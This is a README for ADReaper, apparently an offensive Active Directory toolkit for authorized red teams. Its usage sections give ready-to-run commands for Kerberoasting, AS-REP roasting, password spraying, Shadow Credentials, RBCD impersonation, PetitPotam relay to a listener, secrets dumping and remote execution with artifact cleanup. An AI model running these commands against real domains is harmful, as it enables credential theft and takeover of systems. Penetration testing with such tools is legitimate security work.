# 💀 ADREAPER: Ultimate Active Directory Recon & Attack Toolkit ⚔️

```text
 █████╗ ██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██╔══██║██║  ██║██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                                              @adreaper v3.2.0
```

**ADReaper** is a high-performance, multi-threaded Active Directory reconnaissance and attack orchestration toolkit written in Go. Designed for Red Teams and Penetration Testers, it streamlines the discovery of attack vectors, privilege escalation paths, and sensitive information within complex AD environments.

---

## 🚀 Core Features

### 🔍 Advanced Reconnaissance
- **Intelligent LDAP Enumeration**: Deep object discovery (Users, Groups, Computers, GPOs, OUs) with focused metadata extraction.
- **Global SMB Tree Mapping**: Recursive share discovery and file-level reconnaissance across the entire domain.
- **Infrastructure Port Scanning**: High-speed, multi-threaded port scanner with service fingerprinting and Nmap-style `-Pn` support.
- **DNS Recon**: Automated discovery of Domain Controllers, LDAP services, and network infrastructure via SRV records.

### ⚔️ Combat Modules (Attacks)
- **Shadow Credentials**: Automate the creation of KeyCredentialLink attributes for passwordless authentication.
- **RBCD Automation**: Full orchestration of Resource-Based Constrained Delegation attacks.
- **NTLM Relay Triggers**: Built-in triggers for PetitPotam and PrinterBug to force authentication.
- **Kerberoast & ASREPRoast**: Rapid extraction of service and user tickets for offline cracking.
- **ACL Abuse Engine**: Discover and weaponize vulnerable Security Descriptors (GenericAll, WriteDacl, etc.).
- **GPP Decryption**: Automated recovery of passwords from Group Policy Preferences.

### 🌌 Universal Remote Execution (Authentic Mode)
- **Protocol-Level Relay**: Execute commands on remote targets via SMB/RPC without simulated mocks.
- **Real-Time Output Polling**: Authentically captures STDOUT/STDERR from the target's filesystem via administrative shares.
- **Stealth Cleanup**: Automatic removal of relay artifacts (`.bat` and output files) after execution.

---

## 🛠️ Usage & Commands

### 📋 Global Options
| Flag | Description |
| :--- | :--- |
| `-d, --domain` | Target AD Domain (e.g., lab.local) |
| `-u, --username` | Username for authentication |
| `-p, --password` | Password for authentication |
| `--dc-ip` | IP address of the Domain Controller |
| `--smb-port` | Custom SMB port (default: 445) |
| `-v, --verbose` | Enable verbose output logging |

### 🔍 Phase 1: Infrastructure & Recon
```powershell
# High-speed port scan (All 65k ports) without ping (-Pn)
.\adreaper.exe infra scan --all -Pn --dc-ip 192.168.3.10

# Domain fingerprinting (Functional levels, forest info, DCs)
.\adreaper.exe enum domain --domain lab.local --dc-ip 192.168.3.10

# DNS Service discovery (Identify LDAP/GC/KDC servers)
.\adreaper.exe infra dns --domain lab.local
```

### 👤 Phase 2: User & Group Intelligence
```powershell
# List all domain users with detailed metadata
.\adreaper.exe enum users --domain lab.local -u cgarcia -p 123456

# Find all members of "Domain Admins"
.\adreaper.exe enum groups --name "Domain Admins" --domain lab.local

# Check password policy (Max age, complexity, lockout)
.\adreaper.exe enum policy --domain lab.local
```

### 📂 Phase 3: SMB & Filesystem Recon
```powershell
# List all shares on a target computer
.\adreaper.exe enum shares -t DC01 --domain lab.local

# Recursive tree mapping of all shares (Global view)
.\adreaper.exe enum tree --domain lab.local -u cgarcia -p 123456

# Find sensitive files (.xml, .config, .txt) across the domain
.\adreaper.exe attack harvest --exts xml,config,txt --domain lab.local
```

### ⚔️ Phase 4: Advanced Attack Orquestration
```powershell
# Shadow Credentials (KeyCredentialLink Injection)
.\adreaper.exe attack shadow -t SQL01 -u cgarcia -p 123456

# GPP Password Decryption (Search SYSVOL for groups.xml)
.\adreaper.exe attack gpp --domain lab.local

# Kerberoasting (Extract service tickets for cracking)
.\adreaper.exe attack kerberoast --domain lab.local -u cgarcia

# ASREPRoasting (Extract user tickets without pre-auth)
.\adreaper.exe attack asreproast --domain lab.local

# Targeted Password Spraying
.\adreaper.exe attack spray -u users.txt -p "Password123!" --domain lab.local

# RBCD Automation (Resource-Based Constrained Delegation)
.\adreaper.exe attack rbcd -t DC01 --impersonate Administrator

# NTLM Relay Trigger (PetitPotam)
.\adreaper.exe attack relay -t DC01 --listener 10.10.10.5

# Secrets Dumping (SAM/LSA/DCSync simulation)
.\adreaper.exe attack secrets -t DC01 --domain lab.local
```

### 🌌 Phase 5: Universal Remote Execution
```powershell
# Authentic 'whoami' with all privileges
.\adreaper.exe "whoami /all" --domain lab.local -u administrator -p Pass123

# Full system report via RPC/SMB relay
.\adreaper.exe "systeminfo" --domain lab.local --dc-ip 192.168.3.10

# List processes with real PID capture
.\adreaper.exe "tasklist /v" --domain lab.local -u cgarcia -p 123456
```

---

## 📊 Revolutionary Reporting

### Workspace Intelligence Dashboard (v3.0)
ADReaper automatically generates a **Premium HTML Intelligence Dashboard**. It's not just a report; it's a command center:
- **Auto-Artifact Discovery**: Automatically finds and embeds all JSON artifacts (BloodHound, Loot, Recon) from your workspace.
- **Interactive JSON Viewer**: Browse complex data structures with a built-in, collapsible tree viewer.
- **Dark Mode UI**: Professional, high-contrast design for long engagements.

---

## 🏗️ Architecture

- **`cmd/`**: CLI layer powered by Cobra. Handles command parsing and routing.
- **`internal/recon/`**: The brain of the toolkit. Multi-threaded LDAP, SMB, and DNS engines.
- **`internal/attacks/`**: Weaponized modules for privilege escalation and persistence.
- **`internal/output/`**: Reporting engine supporting Table, JSON, and Premium HTML outputs.

---

## ⚠️ Disclaimer
This tool is intended for legal, authorized security testing and educational purposes only. Unauthorized use of ADReaper against targets without prior written consent is strictly prohibited. The authors are not responsible for any misuse or damage caused by this program.

---
**Developed with ❤️ for the Red Team Community.**
